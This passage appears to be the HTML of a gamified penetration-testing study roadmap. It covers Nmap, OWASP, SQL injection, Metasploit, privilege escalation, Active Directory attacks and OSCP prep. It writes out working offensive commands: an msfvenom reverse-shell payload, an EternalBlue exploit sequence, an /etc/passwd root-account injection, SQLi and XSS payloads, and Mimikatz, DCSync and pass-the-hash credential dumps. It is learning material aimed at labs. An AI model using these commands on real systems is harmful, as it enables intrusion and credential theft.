+      <div class="nb"><div class="nbc">TCP/IP</div><div class="nbt">3-Way Handshake <span class="tag crit">critical</span></div><div class="nbd">Every TCP connection: <code>SYN → SYN-ACK → ACK</code><br><br>Why it matters:<br>• <strong>SYN Flood</strong> — send tons of SYNs, never ACK → exhausts server<br>• <strong>-sS Stealth Scan</strong> — sends SYN, checks SYN-ACK, never completes<br>• <strong>Session Hijacking</strong> — predict sequence numbers</div></div>
+      <div class="nb"><div class="nbc">Key Ports</div><div class="nbt">Memorize These</div><div class="nbd"><code>21</code>FTP &nbsp;<code>22</code>SSH &nbsp;<code>23</code>Telnet &nbsp;<code>25</code>SMTP &nbsp;<code>53</code>DNS<br><code>80</code>HTTP &nbsp;<code>443</code>HTTPS &nbsp;<code>445</code>SMB &nbsp;<code>3306</code>MySQL &nbsp;<code>3389</code>RDP<br><br>SMB (445) and RDP (3389) are historically the most exploited.</div></div>
+    </div>
+    <div class="spbody" id="t-osi-c" style="display:none">
+      <div class="cmd"><button class="cpbtn" onclick="cpy(this)">copy</button><div><span class="pr">$</span><span class="cl"> wireshark &</span></div><div><span class="pr">$</span><span class="cl"> tcpdump -i eth0 tcp port 80</span></div><div class="cm"># Capture and inspect layer by layer</div><div><span class="pr">$</span><span class="cl"> tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'</span></div><div class="cm"># See the 3-way handshake live</div></div>
+      <div class="cmd"><button class="cpbtn" onclick="cpy(this)">copy</button><div class="cm"># Inspect ARP (L2)</div><div><span class="pr">$</span><span class="cl"> arp -a</span></div><div><span class="pr">$</span><span class="cl"> netdiscover -r 192.168.1.0/24</span></div></div>
+    </div>
+    <div class="spbody" id="t-osi-r" style="display:none">
+      <div class="rl">
+        <div class="ri" onclick="ol('https://tryhackme.com/path/outline/presecurity')"><div class="rii wb">🌐</div><div><div class="rin">TryHackMe — Pre-Security Path</div><div class="ris">Networking + OSI hands-on rooms</div></div><div class="rib free">FREE</div></div>
+        <div class="ri" onclick="ol('https://www.youtube.com/watch?v=vv4y_uOneC0')"><div class="rii yt">▶</div><div><div class="rin">Professor Messer — OSI Model</div><div class="ris">CompTIA Network+ series, very clear</div></div><div class="rib free">FREE</div></div>
+        <div class="ri"><div class="rii bk">📚</div><div><div class="rin">CompTIA Network+ N10-008 Study Guide</div><div class="ris">Best reference book for protocols</div></div><div class="rib paid">PAID</div></div>
+      </div>
+    </div>
+  </div>
+  <button class="cbtn done" id="btn-beg1">✓ Topic Completed!</button>
+</div>
+
+<!-- BEG 2: LINUX -->
+<div class="view" id="view-beg2">
+  <div class="sh"><div class="st">// beginner · level 5–15</div><div class="stitle">Linux & Kali Linux</div><div class="sdesc">Every security tool runs on Linux. Master the command line before touching any offensive tools.</div></div>
+  <div class="sp">
+    <div class="sph"><span class="spi">🐧</span><div class="spn">Study Notes</div><div class="spb">IN PROGRESS</div></div>
+    <div class="sptabs">
+      <div class="sptab active" onclick="st(this,'t-lin-n')">Core Notes</div>
+      <div class="sptab" onclick="st(this,'t-lin-c')">Commands</div>
+      <div class="sptab" onclick="st(this,'t-lin-r')">Resources</div>
+    </div>
+    <div class="spbody" id="t-lin-n">
+      <div class="nb"><div class="nbc">Linux Basics</div><div class="nbt">File System & Permissions <span class="tag crit">critical</span></div><div class="nbd">Linux permission format: <code>rwxr-xr--</code><br><strong>r</strong>=read(4) <strong>w</strong>=write(2) <strong>x</strong>=execute(1) for [owner][group][others]<br><br><strong>SUID bit</strong> (<code>chmod u+s</code>) — file runs as file owner, not caller. Massive privesc vector.<br>Find SUID files: <code>find / -perm -4000 2>/dev/null</code><br><br>Key paths: <code>/etc/passwd</code> users · <code>/etc/shadow</code> hashes (root only) · <code>/var/log/</code> logs · <code>/tmp/</code> writable (privesc playground)</div></div>
+      <div class="nb"><div class="nbc">Kali Linux</div><div class="nbt">Essential Tool Categories</div><div class="nbd"><strong>Information Gathering</strong> — nmap, maltego, recon-ng<br><strong>Web Application</strong> — burpsuite, sqlmap, dirb, gobuster<br><strong>Password Attacks</strong> — john, hashcat, hydra<br><strong>Exploitation</strong> — metasploit, msfvenom<br><strong>Post Exploitation</strong> — bloodhound, mimikatz, empire</div></div>
+    </div>
+    <div class="spbody" id="t-lin-c" style="display:none">
+      <div class="cmd"><button class="cpbtn" onclick="cpy(this)">copy</button><div class="cm"># Privesc enumeration — run these after landing a shell</div><div><span class="pr">$</span><span class="cl"> find / -perm -4000 -type f 2>/dev/null</span></div><div class="cm"># SUID binaries</div><div><span class="pr">$</span><span class="cl"> sudo -l</span></div><div class="cm"># What can I run as root?</div><div><span class="pr">$</span><span class="cl"> crontab -l; cat /etc/crontab</span></div><div class="cm"># Cron jobs for privesc</div><div><span class="pr">$</span><span class="cl"> cat /etc/passwd | cut -d: -f1</span></div></div>
+    </div>
+    <div class="spbody" id="t-lin-r" style="display:none">
+      <div class="rl">
+        <div class="ri" onclick="ol('https://overthewire.org/wargames/bandit/')"><div class="rii wb">🌐</div><div><div class="rin">OverTheWire: Bandit</div><div class="ris">Learn Linux by hacking a game — levels 0-34</div></div><div class="rib free">FREE</div></div>
+        <div class="ri" onclick="ol('https://tryhackme.com/room/linux1')"><div class="rii wb">🌐</div><div><div class="rin">TryHackMe — Linux Fundamentals 1,2,3</div><div class="ris">Best beginner Linux rooms</div></div><div class="rib free">FREE</div></div>
+        <div class="ri" onclick="ol('https://linuxcommand.org')"><div class="rii bk">📚</div><div><div class="rin">The Linux Command Line — W. Shotts</div><div class="ris">Free PDF at linuxcommand.org</div></div><div class="rib free">FREE</div></div>
+      </div>
+    </div>
+  </div>
+  <button class="cbtn" id="btn-beg2" onclick="mc('beg2',this,200)">Mark as Complete (+200 XP)</button>
+</div>
+
+<!-- BEG 3: NMAP -->
+<div class="view" id="view-beg3">
+  <div class="sh"><div class="st">// beginner · level 10–20</div><div class="stitle">Nmap & Network Recon</div><div class="sdesc">Know your target before you strike. Nmap is used in every pentest — master it deeply.</div></div>
+  <div class="sp">
+    <div class="sph"><span class="spi">🔍</span><div class="spn">Study Notes</div></div>
+    <div class="sptabs">
+      <div class="sptab active" onclick="st(this,'t-nmap-n')">Core Notes</div>
+      <div class="sptab" onclick="st(this,'t-nmap-c')">Commands</div>
+      <div class="sptab" onclick="st(this,'t-nmap-r')">Resources</div>
+    </div>
+    <div class="spbody" id="t-nmap-n">
+      <div class="nb"><div class="nbc">Nmap Scan Types</div><div class="nbt">Know When to Use Each <span class="tag key">exam topic</span></div><div class="nbd"><strong>-sS (SYN Stealth)</strong> — Default, fastest, doesn't complete handshake. Requires root.<br><strong>-sT (TCP Connect)</strong> — Full handshake, no root needed. Noisier, logged.<br><strong>-sU (UDP)</strong> — Slower but crucial — DNS(53), SNMP(161) are UDP.<br><strong>-sV</strong> — Version detection. Reveals software + version = searchable CVEs.<br><strong>-O</strong> — OS detection. Tailor exploits.<br><strong>-A</strong> — Aggressive (all of the above). Very noisy.<br><strong>-sN/-sF/-sX</strong> — Null/FIN/Xmas. Bypass some firewalls.</div></div>
+      <div class="nb"><div class="nbc">NSE Scripts</div><div class="nbt">Hidden Power</div><div class="nbd"><code>--script=vuln</code> — Run all vulnerability scripts<br><code>--script=http-enum</code> — Find web directories<br><code>--script=smb-vuln-ms17-010</code> — Check for EternalBlue<br><code>--script=ftp-anon</code> — Check anonymous FTP<br><br>Scripts live in <code>/usr/share/nmap/scripts/</code></div></div>
+    </div>
+    <div class="spbody" id="t-nmap-c" style="display:none">
+      <div class="cmd"><button class="cpbtn" onclick="cpy(this)">copy</button><div class="cm"># Full pentest nmap workflow</div><div><span class="pr">$</span><span class="cl"> nmap -sV -sC -p- -T4 &lt;target&gt; -oN scan.txt</span></div><div class="cm"># Full port + version + default scripts, save output</div><div><span class="pr">$</span><span class="cl"> nmap -p- --min-rate 5000 &lt;target&gt;</span></div><div class="cm"># Fast full port scan</div><div><span class="pr">$</span><span class="cl"> nmap --script=vuln &lt;target&gt;</span></div><div><span class="pr">$</span><span class="cl"> nmap -sU --top-ports 100 &lt;target&gt;</span></div><div class="cm"># UDP scan</div></div>
+    </div>
+    <div class="spbody" id="t-nmap-r" style="display:none">
+      <div class="rl">
+        <div class="ri" onclick="ol('https://tryhackme.com/room/furthernmap')"><div class="rii wb">🌐</div><div><div class="rin">TryHackMe — Nmap Room</div><div class="ris">Hands-on lab, covers all scan types</div></div><div class="rib free">FREE</div></div>
+        <div class="ri" onclick="ol('https://nmap.org/book/')"><div class="rii bk">📚</div><div><div class="rin">Nmap Reference Guide (nmap.org/book)</div><div class="ris">Official docs — bookmark this</div></div><div class="rib free">FREE</div></div>
+        <div class="ri" onclick="ol('https://www.youtube.com/@ippsec')"><div class="rii yt">▶</div><div><div class="rin">IppSec — HTB Writeups</div><div class="ris">See Nmap used in real pentests</div></div><div class="rib free">FREE</div></div>
+      </div>
+    </div>
+  </div>
+  <button class="cbtn" id="btn-beg3" onclick="mc('beg3',this,200)">Mark as Complete (+200 XP)</button>
+</div>
+
+<!-- BEG 4: BURP/OWASP -->
+<div class="view" id="view-beg4">
+  <div class="sh"><div class="st">// beginner · level 15–25</div><div class="stitle">Burp Suite & OWASP Top 10</div><div class="sdesc">The holy bible of web security. Every bug bounty and web pentest starts here.</div></div>
+  <div class="sp">
+    <div class="sph"><span class="spi">🕷</span><div class="spn">Study Notes</div></div>
+    <div class="sptabs">
+      <div class="sptab active" onclick="st(this,'t-owasp-n')">OWASP Notes</div>
+      <div class="sptab" onclick="st(this,'t-burp-n')">Burp Tips</div>
+      <div class="sptab" onclick="st(this,'t-owasp-r')">Resources</div>
+    </div>
+    <div class="spbody" id="t-owasp-n">
+      <div class="nb"><div class="nbc">OWASP Top 10 (2021)</div><div class="nbt">The 10 Critical Web Vulnerabilities <span class="tag crit">critical</span></div><div class="nbd"><strong>A01 Broken Access Control</strong> — Most common. IDOR, force-browse, privilege escalation.<br><strong>A02 Cryptographic Failures</strong> — Sensitive data plaintext, weak ciphers.<br><strong>A03 Injection</strong> — SQL, Command, LDAP, XSS. Input not sanitized.<br><strong>A04 Insecure Design</strong> — Logic flaws baked into architecture.<br><strong>A05 Security Misconfiguration</strong> — Default creds, open S3, verbose errors.<br><strong>A06 Vulnerable Components</strong> — Outdated libs with known CVEs (Log4Shell!).<br><strong>A07 Auth Failures</strong> — Weak passwords, broken sessions, JWT flaws.<br><strong>A08 Software Integrity Failures</strong> — Supply chain attacks.<br><strong>A09 Logging Failures</strong> — No audit trail.<br><strong>A10 SSRF</strong> — Server-Side Request Forgery → pivot to internal services.</div></div>
+    </div>
+    <div class="spbody" id="t-burp-n" style="display:none">
+      <div class="nb"><div class="nbc">Burp Suite</div><div class="nbt">Must-Know Features & Shortcuts</div><div class="nbd"><strong>Proxy</strong> — Intercept + modify every HTTP request/response.<br><strong>Repeater</strong> — Replay requests, test payloads one by one.<br><strong>Intruder</strong> — Automated fuzzing, brute force login.<br><strong>Decoder</strong> — Base64, URL, HTML decode/encode.<br><br><strong>Ctrl+R</strong> → Send to Repeater &nbsp;·&nbsp; <strong>Ctrl+I</strong> → Send to Intruder<br><br>Tip: Always set FoxyProxy in Firefox. Learn shortcuts to move fast.</div></div>
+    </div>
+    <div class="spbody" id="t-owasp-r" style="display:none">
+      <div class="rl">
+        <div class="ri" onclick="ol('https://portswigger.net/web-security')"><div class="rii wb">🌐</div><div><div class="rin">PortSwigger Web Security Academy</div><div class="ris">Best free web security course — all OWASP topics + labs</div></div><div class="rib free">FREE</div></div>
+        <div class="ri" onclick="ol('https://owasp.org/www-project-webgoat/')"><div class="rii tl">🛠</div><div><div class="rin">OWASP WebGoat / DVWA</div><div class="ris">Intentionally vulnerable apps to practice locally</div></div><div class="rib free">FREE</div></div>
+        <div class="ri" onclick="ol('https://www.youtube.com/@RanaKhalil101')"><div class="rii yt">▶</div><div><div class="rin">Rana Khalil — OWASP Playlist</div><div class="ris">Deep dives on each OWASP category</div></div><div class="rib free">FREE</div></div>
+      </div>
+    </div>
+  </div>
+  <button class="cbtn" id="btn-beg4" onclick="mc('beg4',this,200)">Mark as Complete (+200 XP)</button>
+</div>
+
+<!-- BEG 5: SQLI & XSS -->
+<div class="view" id="view-beg5">
+  <div class="sh"><div class="st">// beginner · level 20–30</div><div class="stitle">SQL Injection & XSS</div><div class="sdesc">The two most exploited vulnerabilities in web history. Master these before intermediate.</div></div>
+  <div class="sp">
+    <div class="sph"><span class="spi">💉</span><div class="spn">Study Notes</div></div>
+    <div class="sptabs">
+      <div class="sptab active" onclick="st(this,'t-sqli-n')">SQLi Notes</div>
+      <div class="sptab" onclick="st(this,'t-xss-n')">XSS Notes</div>
+      <div class="sptab" onclick="st(this,'t-sqli-r')">Resources</div>
+    </div>
+    <div class="spbody" id="t-sqli-n">
+      <div class="nb"><div class="nbc">SQL Injection</div><div class="nbt">Types & Payloads <span class="tag crit">critical</span></div><div class="nbd"><strong>Classic/Error-Based</strong> — App shows SQL errors. Try: <code>' OR '1'='1</code><br><strong>Union-Based</strong> — Extract other tables: <code>' UNION SELECT 1,table_name,3 FROM information_schema.tables--</code><br><strong>Blind Boolean</strong> — No output: <code>' AND 1=1--</code> vs <code>' AND 1=2--</code><br><strong>Time-Based</strong> — Infer from delay: <code>'; WAITFOR DELAY '0:0:5'--</code><br><br>Automated: <code>sqlmap -u "http://target/page?id=1" --dbs</code></div></div>
+    </div>
+    <div class="spbody" id="t-xss-n" style="display:none">
+      <div class="nb"><div class="nbc">Cross-Site Scripting</div><div class="nbt">XSS Types & Impact <span class="tag key">bug bounty fave</span></div><div class="nbd"><strong>Reflected XSS</strong> — Payload in URL, reflected back. Requires user to click link.<br>Test: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><br><strong>Stored XSS</strong> — Saved in DB, executes for every visitor. High severity.<br><br><strong>DOM XSS</strong> — Happens in client JS. Check <code>innerHTML</code>, <code>document.write</code>.<br><br><strong>Real Impact:</strong> Cookie theft (<code>document.cookie</code>), session hijacking, keylogging, phishing overlays.</div></div>
+    </div>
+    <div class="spbody" id="t-sqli-r" style="display:none">
+      <div class="rl">
+        <div class="ri" onclick="ol('https://portswigger.net/web-security/sql-injection')"><div class="rii wb">🌐</div><div><div class="rin">PortSwigger — SQL Injection Labs</div><div class="ris">18 labs from apprentice to expert</div></div><div class="rib free">FREE</div></div>
+        <div class="ri" onclick="ol('https://sqlmap.org')"><div class="rii tl">🛠</div><div><div class="rin">SQLMap</div><div class="ris">Automate SQLi detection and exploitation</div></div><div class="rib free">FREE</div></div>
+      </div>
+    </div>
+  </div>
+  <button class="cbtn" id="btn-beg5" onclick="mc('beg5',this,200)">Mark as Complete (+200 XP)</button>
+</div>
+
+<!-- MID 1: METASPLOIT -->
+<div class="view" id="view-mid1">
+  <div class="sh"><div class="st">// intermediate · level 30–40</div><div class="stitle">Metasploit Framework</div><div class="sdesc">The world's most widely used exploitation framework. Essential for OSCP and real pentests.</div></div>
+  <div class="sp">
+    <div class="sph"><span class="spi">🔫</span><div class="spn">Study Notes</div><div class="spb" style="background:rgba(168,85,247,0.1);color:var(--purple);border-color:rgba(168,85,247,0.3)">INTERMEDIATE</div></div>
+    <div class="sptabs">
+      <div class="sptab active" onclick="st(this,'t-msf-n')">Core Notes</div>
+      <div class="sptab" onclick="st(this,'t-msf-c')">Commands</div>
+      <div class="sptab" onclick="st(this,'t-msf-r')">Resources</div>
+    </div>
+    <div class="spbody" id="t-msf-n">
+      <div class="nb"><div class="nbc">Metasploit Architecture</div><div class="nbt">Key Components <span class="tag crit">critical</span></div><div class="nbd"><strong>Exploit</strong> — Code that triggers a specific vulnerability.<br><strong>Payload</strong> — What runs after exploit (shell, meterpreter).<br><strong>Auxiliary</strong> — Scanners, fuzzers, brute-forcers. No payload.<br><strong>Post</strong> — Post-exploitation modules after you have a shell.<br><strong>Encoder</strong> — Obfuscate payloads to evade AV detection.<br><br><strong>Meterpreter</strong> = king payload. Runs in memory, encrypted comms.</div></div>
+      <div class="nb"><div class="nbc">msfvenom</div><div class="nbt">Payload Generation</div><div class="nbd"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -f exe -o shell.exe</code><br><br>Flags: <code>-p</code> payload · <code>-e</code> encoder · <code>-i</code> iterations · <code>-f</code> format · <code>-o</code> output</div></div>
+    </div>
+    <div class="spbody" id="t-msf-c" style="display:none">
+      <div class="cmd"><button class="cpbtn" onclick="cpy(this)">copy</button><div class="cm"># EternalBlue — EternalBlue attack on Windows SMB</div><div><span class="pr">msf6></span><span class="cl"> search ms17-010</span></div><div><span class="pr">msf6></span><span class="cl"> use exploit/windows/smb/ms17_010_eternalblue</span></div><div><span class="pr">msf6></span><span class="cl"> set RHOSTS 10.10.10.40</span></div><div><span class="pr">msf6></span><span class="cl"> set payload windows/x64/meterpreter/reverse_tcp</span></div><div><span class="pr">msf6></span><span class="cl"> set LHOST tun0</span></div><div><span class="pr">msf6></span><span class="cl"> run</span></div></div>
+      <div class="cmd"><button class="cpbtn" onclick="cpy(this)">copy</button><div class="cm"># Post-exploitation with meterpreter</div><div><span class="pr">meterpreter></span><span class="cl"> sysinfo</span></div><div><span class="pr">meterpreter></span><span class="cl"> getuid</span></div><div><span class="pr">meterpreter></span><span class="cl"> hashdump</span></div><div><span class="pr">meterpreter></span><span class="cl"> run post/multi/recon/local_exploit_suggester</span></div></div>
+    </div>
+    <div class="spbody" id="t-msf-r" style="display:none">
+      <div class="rl">
+        <div class="ri" onclick="ol('https://www.offsec.com/metasploit-unleashed/')"><div class="rii bk">📚</div><div><div class="rin">Metasploit Unleashed (offsec.com)</div><div class="ris">Free official Metasploit training</div></div><div class="rib free">FREE</div></div>
+        <div class="ri" onclick="ol('https://tryhackme.com/room/rpmetasploit')"><div class="rii wb">🌐</div><div><div class="rin">TryHackMe — Metasploit</div><div class="ris">Guided labs using Metasploit on real VMs</div></div><div class="rib free">FREE</div></div>
+      </div>
+    </div>
+  </div>
+  <button class="cbtn" id="btn-mid1" onclick="mc('mid1',this,300)">Mark as Complete (+300 XP)</button>
+</div>
+
+<!-- MID 2: PRIVESC -->
+<div class="view" id="view-mid2">
+  <div class="sh"><div class="st">// intermediate · level 35–50</div><div class="stitle">Privilege Escalation</div><div class="sdesc">Getting a shell is step one. Becoming root/SYSTEM is the goal. This is 40% of any OSCP exam.</div></div>
+  <div class="sp">
+    <div class="sph"><span class="spi">⬆</span><div class="spn">Study Notes</div></div>
+    <div class="sptabs">
+      <div class="sptab active" onclick="st(this,'t-pe-l')">Linux PrivEsc</div>
+      <div class="sptab" onclick="st(this,'t-pe-w')">Windows PrivEsc</div>
+      <div class="sptab" onclick="st(this,'t-pe-r')">Resources</div>
+    </div>
+    <div class="spbody" id="t-pe-l">
+      <div class="nb"><div class="nbc">Linux</div><div class="nbt">Top Vectors <span class="tag crit">OSCP essential</span></div><div class="nbd"><strong>1. Sudo misconfigs</strong> — <code>sudo -l</code> → NOPASSWD entries<br><strong>2. SUID/SGID</strong> — <code>find / -perm -4000</code> → check GTFOBins<br><strong>3. Cron jobs</strong> — Writable scripts run by root cron = RCE as root<br><strong>4. Writable /etc/passwd</strong> — <code>echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd</code><br><strong>5. NFS no_root_squash</strong> — Mount + create SUID binary<br><strong>6. PATH hijacking</strong> — SUID binary calls relative cmd → hijack PATH<br><strong>7. Kernel exploits</strong> — <code>uname -a</code> → DirtyCOW etc.<br><br>First step: run <strong>LinPEAS</strong> immediately!</div></div>
+    </div>
+    <div class="spbody" id="t-pe-w" style="display:none">
+      <div class="nb"><div class="nbc">Windows</div><div class="nbt">Top Vectors</div><div class="nbd"><strong>1. AlwaysInstallElevated</strong> — MSI installs as SYSTEM<br><strong>2. Unquoted Service Paths</strong> — Spaces in path → Windows finds your binary<br><strong>3. Weak Service Permissions</strong> — Modify service binary path<br><strong>4. SeImpersonatePrivilege</strong> — Juicy/PrintSpoofer/GodPotato<br><strong>5. Stored Credentials</strong> — <code>cmdkey /list</code>, SAM hive, WinSCP configs<br><strong>6. DLL Hijacking</strong> — Place malicious DLL in search path<br><br>Run <strong>WinPEAS</strong> or <strong>PowerUp.ps1</strong> immediately!</div></div>
+    </div>
+    <div class="spbody" id="t-pe-r" style="display:none">
+      <div class="rl">
+        <div class="ri" onclick="ol('https://gtfobins.github.io')"><div class="rii wb">🌐</div><div><div class="rin">GTFOBins</div><div class="ris">Every SUID/sudo binary privesc technique</div></div><div class="rib free">FREE</div></div>
+        <div class="ri" onclick="ol('https://github.com/swisskyrepo/PayloadsAllTheThings')"><div class="rii bk">📚</div><div><div class="rin">PayloadsAllTheThings</div><div class="ris">Massive GitHub privesc reference</div></div><div class="rib free">FREE</div></div>
+      </div>
+    </div>
+  </div>
+  <button class="cbtn" id="btn-mid2" onclick="mc('mid2',this,300)">Mark as Complete (+300 XP)</button>
+</div>
+
+<!-- MID 3: AD -->
+<div class="view" id="view-mid3">
+  <div class="sh"><div class="st">// intermediate · level 45–60</div><div class="stitle">Active Directory Attacks</div><div class="sdesc">90% of enterprise networks run AD. Kerberoasting, BloodHound, Mimikatz — where real money is.</div></div>
+  <div class="sp">
+    <div class="sph"><span class="spi">🏰</span><div class="spn">Study Notes</div></div>
+    <div class="sptabs">
+      <div class="sptab active" onclick="st(this,'t-ad-n')">Core Notes</div>
+      <div class="sptab" onclick="st(this,'t-ad-c')">Commands</div>
+      <div class="sptab" onclick="st(this,'t-ad-r')">Resources</div>
+    </div>
+    <div class="spbody" id="t-ad-n">
+      <div class="nb"><div class="nbc">AD Attack Chain</div><div class="nbt">Full Path to Domain Admin <span class="tag crit">critical</span></div><div class="nbd">Attack path: <strong>Enumerate → Foothold → Lateral Movement → DA</strong><br><br><strong>Kerberoasting</strong> — Request TGS for SPNs → offline crack → plaintext password<br><code>GetUserSPNs.py -request -dc-ip &lt;DC&gt; domain/user</code><br><br><strong>AS-REP Roasting</strong> — Accounts with no pre-auth → request AS-REP → crack<br><br><strong>Pass-the-Hash</strong> — Use NTLM hash directly<br><code>psexec.py domain/admin@target -hashes :&lt;NTLM&gt;</code><br><br><strong>DCSync</strong> — Simulate DC replication → dump all hashes<br><code>secretsdump.py domain/user@dc-ip</code></div></div>
+      <div class="nb"><div class="nbc">Tools</div><div class="nbt">BloodHound + Mimikatz</div><div class="nbd"><strong>BloodHound</strong> — Graphs AD. Shows paths to Domain Admin. Run SharpHound → import → query "Shortest paths to DA"<br><br><strong>Mimikatz</strong> — Dump creds from LSASS. Requires SYSTEM.<br><code>privilege::debug</code> → <code>sekurlsa::logonpasswords</code><br><code>lsadump::dcsync /domain:corp /user:Administrator</code></div></div>
+    </div>
+    <div class="spbody" id="t-ad-c" style="display:none">
+      <div class="cmd"><button class="cpbtn" onclick="cpy(this)">copy</button><div class="cm"># AD attack chain commands</div><div><span class="pr">$</span><span class="cl"> bloodhound-python -u user -p pass -d domain.local -dc dc01</span></div><div><span class="pr">$</span><span class="cl"> GetUserSPNs.py domain/user:pass -dc-ip &lt;DC&gt; -request</span></div><div><span class="pr">$</span><span class="cl"> hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt</span></div><div><span class="pr">$</span><span class="cl"> crackmapexec smb &lt;subnet&gt; -u user -p pass --sam</span></div></div>
+    </div>
+    <div class="spbody" id="t-ad-r" style="display:none">
+      <div class="rl">
+        <div class="ri" onclick="ol('https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course')"><div class="rii bk">📚</div><div><div class="rin">TCM Security — Practical Ethical Hacking</div><div class="ris">Best AD course, covers full attack chain</div></div><div class="rib paid">~$30</div></div>
+        <div class="ri" onclick="ol('https://academy.hackthebox.com/module/details/74')"><div class="rii wb">🌐</div><div><div class="rin">HTB Academy — Active Directory 101</div><div class="ris">Free module on HackTheBox Academy</div></div><div class="rib free">FREE</div></div>
+      </div>
+    </div>
+  </div>
+  <button class="cbtn" id="btn-mid3" onclick="mc('mid3',this,300)">Mark as Complete (+300 XP)</button>
+</div>
+
+<!-- MID 4: MALWARE & SIEM -->
+<div class="view" id="view-mid4">
+  <div class="sh"><div class="st">// intermediate · level 50–60</div><div class="stitle">Malware Analysis & SIEM</div><div class="sdesc">Understand what attackers deploy. SIEM visibility is critical for SOC and blue team roles.</div></div>
+  <div class="sp">
+    <div class="sph"><span class="spi">🦠</span><div class="spn">Study Notes</div></div>
+    <div class="sptabs">
+      <div class="sptab active" onclick="st(this,'t-mal-n')">Malware Analysis</div>
+      <div class="sptab" onclick="st(this,'t-siem-n')">SIEM / Splunk</div>
+      <div class="sptab" onclick="st(this,'t-mal-r')">Resources</div>
+    </div>
+    <div class="spbody" id="t-mal-n">
+      <div class="nb"><div class="nbc">Malware Analysis</div><div class="nbt">Static vs Dynamic</div><div class="nbd"><strong>Static Analysis</strong> — Examine without running. Tools: <code>strings</code>, <code>file</code>, <code>Ghidra</code>, <code>IDA Pro</code>.<br>Look for: hardcoded IPs, suspicious imports (VirtualAlloc, WriteProcessMemory), packed sections.<br><br><strong>Dynamic Analysis</strong> — Run in sandbox. Tools: <code>Any.run</code>, <code>Cuckoo Sandbox</code>, <code>Wireshark</code>, <code>RegShot</code>.<br>Watch for: new processes, registry writes, network connections, dropped files.</div></div>
+    </div>
+    <div class="spbody" id="t-siem-n" style="display:none">
+      <div class="nb"><div class="nbc">Splunk / SIEM</div><div class="nbt">SOC Analyst Must-Know</div><div class="nbd">SPL (Splunk Processing Language) — SQL-like for log analysis.<br><br>Failed logins: <code>index=security EventCode=4625 | stats count by src_ip</code><br>Lateral movement: <code>index=security EventCode=4624 LogonType=3 | rare src_ip</code><br>PowerShell detection: <code>index=* "IEX" OR "Invoke-Expression" | table _time,host,CommandLine</code><br><br>Key Windows Event IDs:<br><code>4624</code> Logon · <code>4625</code> Failed logon · <code>4688</code> Process created<br><code>4698</code> Scheduled task · <code>7045</code> New service installed</div></div>
+    </div>
+    <div class="spbody" id="t-mal-r" style="display:none">
+      <div class="rl">
+        <div class="ri" onclick="ol('https://any.run')"><div class="rii tl">🛠</div><div><div class="rin">ANY.RUN — Interactive Sandbox</div><div class="ris">Analyze malware in browser, free tier</div></div><div class="rib free">FREE</div></div>
+        <div class="ri" onclick="ol('https://ghidra-sre.org')"><div class="rii tl">🛠</div><div><div class="rin">Ghidra — NSA Reverse Engineering Tool</div><div class="ris">Free IDA alternative, very powerful</div></div><div class="rib free">FREE</div></div>
+        <div class="ri" onclick="ol('https://tryhackme.com/room/splunk101')"><div class="rii wb">🌐</div><div><div class="rin">TryHackMe — Splunk Fundamentals</div><div class="ris">Hands-on SOC analyst training</div></div><div class="rib free">FREE</div></div>
+      </div>
+    </div>
+  </div>
+  <button class="cbtn" id="btn-mid4" onclick="mc('mid4',this,300)">Mark as Complete (+300 XP)</button>
+</div>
+
+<!-- ADV 1: OSCP -->
+<div class="view" id="view-adv1">
+  <div class="sh"><div class="st">// advanced · level 60–75</div><div class="stitle">Red Teaming & OSCP Prep</div><div class="sdesc">The OSCP is your ticket. 24-hour exam, real machines, no guides. Prepare with structure.</div></div>
+  <div class="sp">
+    <div class="sph"><span class="spi">🎯</span><div class="spn">OSCP Study Notes</div><div class="spb" style="background:rgba(255,71,87,0.1);color:var(--red);border-color:rgba(255,71,87,0.3)">ADVANCED</div></div>
+    <div class="sptabs">
+      <div class="sptab active" onclick="st(this,'t-oscp-n')">OSCP Strategy</div>
+      <div class="sptab" onclick="st(this,'t-oscp-b')">Practice Boxes</div>
+      <div class="sptab" onclick="st(this,'t-oscp-r')">Resources</div>
+    </div>
+    <div class="spbody" id="t-oscp-n">
+      <div class="nb"><div class="nbc">OSCP Exam Strategy</div><div class="nbt">How to Score 70/100 <span class="tag crit">exam critical</span></div><div class="nbd">5 machines. Each has foothold + privesc. Total 100 pts.<br>Target: <strong>Buffer Overflow (25pts) + 3 machines (15+15+20) + 10pts bonus lab = 85pts</strong><br><br><strong>Methodology on every box:</strong><br>1. <code>nmap -sV -sC -p- --min-rate 5000 target</code><br>2. Enumerate every open service deeply<br>3. Check versions → SearchSploit + Google CVEs<br>4. Foothold → immediately run LinPEAS/WinPEAS<br>5. Document everything — screenshots + commands<br><br><strong>Never rabbit hole</strong> — stuck 30+ min? Move to next machine.</div></div>
+    </div>
+    <div class="spbody" id="t-oscp-b" style="display:none">
+      <div class="nb"><div class="nbc">Practice Machines</div><div class="nbt">TJ Null's OSCP List — Gold Standard</div><div class="nbd">Complete all of these before the exam:<br><br>HTB Easy: <code>Lame</code>, <code>Legacy</code>, <code>Blue</code>, <code>Jerry</code>, <code>Grandpa</code>, <code>Granny</code><br>HTB Medium: <code>Bastard</code>, <code>Devel</code>, <code>Optimum</code>, <code>Nibbles</code>, <code>Beep</code><br>HTB Hard: <code>Tally</code>, <code>Mango</code>, <code>Multimaster</code><br><br>VulnHub: <code>Kioptrix 1-5</code>, <code>Mr. Robot</code>, <code>DC-1 through DC-9</code></div></div>
+    </div>
+    <div class="spbody" id="t-oscp-r" style="display:none">
+      <div class="rl">
+        <div class="ri" onclick="ol('https://www.offsec.com/courses/pen-200/')"><div class="rii bk">📚</div><div><div class="rin">Offensive Security — PEN-200 (PWK)</div><div class="ris">Official OSCP course with 70-day lab</div></div><div class="rib paid">$1499</div></div>
+        <div class="ri" onclick="ol('https://www.youtube.com/@ippsec')"><div class="rii yt">▶</div><div><div class="rin">IppSec — HackTheBox Walkthroughs</div><div class="ris">Watch methodology on TJ Null list machines</div></div><div class="rib free">FREE</div></div>
+        <div class="ri" onclick="ol('https://academy.tcm-sec.com')"><div class="rii bk">📚</div><div><div class="rin">TCM Security — Practical Ethical Hacking</div><div class="ris">Best OSCP prep, covers entire syllabus</div></div><div class="rib paid">$30</div></div>
+      </div>
+    </div>
+  </div>
